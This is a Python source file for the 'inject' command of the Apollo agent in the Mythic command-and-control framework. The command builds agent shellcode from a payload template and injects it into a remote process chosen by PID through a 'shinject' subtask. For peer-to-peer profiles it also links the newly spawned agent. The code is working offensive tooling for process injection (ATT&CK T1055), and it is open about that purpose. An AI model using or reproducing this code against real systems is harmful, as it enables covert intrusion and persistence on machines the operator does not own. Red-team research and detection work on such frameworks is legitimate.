from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *
import base64
import sys

class InjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.Payload,
                supported_agents=["apollo"],
                supported_agent_build_parameters={"apollo": {"output_type": "Shellcode"}}),
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number),
        ]

    errorMsg = "Missing required parameter: {}"

    async def parse_arguments(self):
        if (self.command_line[0] != "{"):
            raise Exception("Inject requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)
        if self.get_arg("pid") == 0:
            raise Exception("Required non-zero PID")

class InjectCommand(CommandBase):
    cmd = "inject"
    attributes=CommandAttributes(
        dependencies=["shinject"]
    )
    needs_admin = False
    help_cmd = "inject (modal popup)"
    description = "Inject agent shellcode into a remote process."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    script_only = True
    author = "@djhohnstein"
    argument_class = InjectArguments
    attackmapping = ["T1055"]


    async def inject_callback(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        task.status = MythicStatus.Completed
        return task

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        temp = await MythicRPC().execute("get_payload",
                                         payload_uuid=task.args.get_arg("template"))
        gen_resp = await MythicRPC().execute("create_payload_from_uuid",
                                             task_id=task.id,
                                             payload_uuid=task.args.get_arg('template'),
                                             new_description="{}'s injection into PID {}".format(task.operator, str(task.args.get_arg("pid"))))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicRPC().execute("get_payload", 
                                                 payload_uuid=gen_resp.response["uuid"],
                                                 get_contents=True)
                if resp.status == MythicStatus.Success:
                    if resp.response["build_phase"] == 'success':
                        b64contents = resp.response["contents"]
                        pe = base64.b64decode(b64contents)
                        if len(pe) > 1 and pe[:2] == b"\x4d\x5a":
                            raise Exception("Inject requires a payload of Raw output, but got an executable.")
                        # it's done, so we can register a file for it
                        task.display_params = "payload '{}' into PID {}".format(temp.response["tag"], task.args.get_arg("pid"))
                        task.status = MythicStatus.Processed
                        print(resp.response["c2info"])
                        sys.stdout.flush()
                        c2_info = resp.response["c2info"][0]
                        is_p2p = c2_info.get("is_p2p")
                        if not is_p2p:
                            response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                                         command="shinject", params_dict={"pid": task.args.get_arg("pid"), "shellcode-file-id": resp.response["file"]["agent_file_id"]},
                                         subtask_callback_function="inject_callback")
                        else:
                            response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                                         command="shinject", params_dict={"pid": task.args.get_arg("pid"), "shellcode-file-id": resp.response["file"]["agent_file_id"]})
                            if response.status == MythicStatus.Success:
                                connection_info = {
                                    "host": "127.0.0.1",
                                    "agent_uuid": gen_resp.response["uuid"],
                                    "c2_profile": c2_info
                                }
                                print(connection_info)
                                sys.stdout.flush()
                                response = await MythicRPC().execute("create_subtask",
                                    parent_task_id=task.id,
                                    command="link",
                                    params_dict={
                                        "connection_info": connection_info
                                    }, subtask_callback_function="inject_callback")
                                task.status = response.status
                            else:
                                task.status = MythicStatus.Error
                            
                        break
                    elif resp.response["build_phase"] == 'error':
                        raise Exception("Failed to build new payload: " + resp.response["error_message"])
                    else:
                        await asyncio.sleep(1)
        else:
            raise Exception("Failed to build payload from template {}".format(task.args.get_arg("template")))
        return task

    async def process_response(self, response: AgentResponse):
        pass
